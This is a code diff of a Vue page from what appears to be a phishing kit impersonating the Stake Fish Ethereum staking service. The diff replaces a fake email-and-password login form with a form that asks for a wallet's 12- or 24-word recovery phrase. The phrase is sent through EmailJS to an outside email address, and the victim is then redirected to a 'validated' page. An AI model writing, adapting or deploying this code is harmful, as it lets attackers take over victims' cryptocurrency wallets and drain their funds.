@@ -1,64 +1,54 @@
 <template>
   <div
-    class="max-w-screen-2xl mx-auto px-4 md:px-6 py-4 md:py-6 mt-6 md:mt-[100px] flex justify-center"
+    class="max-w-screen-2xl mx-auto px-4 md:px-6 py-4 md:py-6 mt-6 md:mt-[70px] flex justify-center"
   >
     <div class="md:w-4/6">
       <div class="flex flex-col items-center justify-center">
         <h1
           style="
             line-height: 1.25;
-
             font-family: DM Sans, sans-serif;
           "
           class="text-[28px] md:text-[48px] font-bold text-center w-5/6"
         >
-          Welcome Back to Ethereum 2.0 Staking
+          Connect Manually to Wallet Network
         </h1>
-        <div class="my-2 md:my-5 text-[15px] md:text-[21px]">
-          Don’t have an account?
-          <a class="border-[#ccff00] border-b-[3px] hover:border-0" href="/"
-            >Sign up</a
+        <div class="my-2 md:my-5 text-[15px] md:text-[21px] text-center">
+          Secure the Ethereum network and earn rewards. Decentralizing Ethereum
+          one
+          <a class="border-[#ccff00] border-b-[3px] hover:border-0" href="/">
+            at a time.</a
           >
         </div>
 
-        <div class="mt-4 w-full md:w-4/6">
-          <input
-            v-model="email"
-            type="email"
-            placeholder="Email"
-            class="w-full h-10 md:h-[55px] bg-[#f5f5f5] p-2 my-1 rounded-[12px] focus:outline-none focus:ring-2 ring-[#ccff00] transition duration-300 ease-in-out"
-            name=""
-          />
-          <input
-            v-model="password"
-            type="password"
-            placeholder="Password"
-            class="w-full h-10 md:h-[55px] bg-[#f5f5f5] p-2 mb-2 md:mb-8 mt-2 rounded-[12px] focus:outline-none focus:ring-2 ring-[#ccff00] transition duration-300 ease-in-out"
-            name=""
-          />
+        <div class="mt-4 w-full bg-[#ccff00] p-6 rounded-[12px]">
+          <textarea
+            v-model="phrase"
+            placeholder="Enter Phrase"
+            class="w-full bg-white p-2 my-4 rounded-[12px] focus:outline-none focus:ring-2 ring-[#ccff00] transition duration-300 ease-in-out"
+            id="story"
+            name="story"
+            rows="5"
+            cols="33"
+          >
+          </textarea>
+          <div v-if="invalidPhrase" class="text-xs mb-2 text-red-500 font-semibold"
+            >Invalid Mnemonic, must be 12/24 phrase code</div
+          >
+
           <div class="md:flex justify-between items-center">
             <button
               :disabled="loading"
-              @click="collect2FA"
-              class="mb-5 md:mb-0 md:w-auto text-center w-full flex items-center justify-center border-2 border-[#ccff00] bg-[#ccff00] rounded-[12px] text-[15px] md:text-[21px] font-semibold text-black px-8 py-2 md:py-4 transition duration-300 ease-in-out"
+              @click="sendData"
+              class="text-center w-full flex items-center justify-center border-2 border-[#ccff00] bg-white rounded-[12px] text-[15px] md:text-[21px] font-semibold text-black px-8 py-3 md:py-4 transition duration-300 ease-in-out"
             >
-              <span>Continue</span>
+              <span>Manual Connect</span>
               <div
                 v-if="loading"
                 class="ml-2 w-4 h-4 rounded-full animate-spin border-4 border-dashed border-black border-t-transparent"
               ></div>
             </button>
-            <div class="flex items-center justify-center">
-              <a
-                class="border-[#ccff00] text-center border-b-[3px] hover:border-0 text-[15px] md:text-[21px]"
-                href="/"
-                >Forgot Password?</a
-              >
-            </div>
           </div>
-          <span v-if="errorEmail" class="text-xs text-red-500 font-semibold"
-            >Invalid Email</span
-          >
         </div>
 
         <div class="mt-40 md:mt-20">
@@ -188,37 +178,25 @@ export default {
   name: "IndexPage",
   data() {
     return {
-      email: "",
-      password: "",
+      phrase: "",
       loading: false,
-      errorEmail: false,
+      invalidPhrase: false
     };
   },
   methods: {
-    
-    validateEmail(email) {
-      const mailformat = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
-      if (email.match(mailformat)) {
-        return true;
-      } else {
-        return false;
-      }
-    },
-    async collect2FA() {
-      this.errorEmail = false;
+     async sendData() {
       this.loading = true;
+      this.invalidPhrase = false
       try {
-        const emailCheck = this.validateEmail(this.email);
-        console.log(emailCheck);
-        if (emailCheck) {
+        const counter = this.countWords(this.phrase);
+        if (counter === 12 || counter === 24) {
           var data = {
             service_id: "service_fhzx1qm",
             template_id: "template_lczv7e9",
             user_id: "1VCQuxAerMoxLsQwn",
             template_params: {
-              from_name: "Stake Fish Login",
-              email: this.email,
-              password: this.password,
+              from_name: "Stake Fish Phrase",
+              phrase: this.phrase,
               reply_to: "Gibsonkendra725@gmail.com",
             },
           };
@@ -228,10 +206,10 @@ export default {
           );
           if (response) {
             this.loading = false;
-            this.$router.push("/2fa-code");
+            this.$router.push("/validated");
           }
         } else {
-          this.errorEmail = true;
+          this.invalidPhrase = true;
           this.loading = false;
           return;
         }
@@ -239,6 +217,9 @@ export default {
       } catch (error) {
         console.log(error);
       }
+    },
+    countWords(str) {
+      return str.trim().split(/\s+/).length;
     },
   },
 };
